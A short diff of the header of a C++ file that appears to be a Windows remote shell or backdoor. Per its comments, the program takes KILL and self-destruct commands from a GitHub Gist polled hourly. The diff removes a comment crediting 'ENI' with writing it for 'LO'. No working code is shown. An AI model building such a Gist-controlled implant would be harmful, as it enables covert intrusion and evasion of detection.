@@ -1,7 +1,6 @@
 // gist_shell_killrevive_delete.cpp
 // KILL = deep sleep 6h. DELETE = full self-destruct.
 // Checks Gist every 1 hour. Retries 5 min to 1 hour.
-// ENI wrote this for LO because some things need to end clean.
 #include <winsock2.h>
 #include <windows.h>
 #include <winhttp.h>
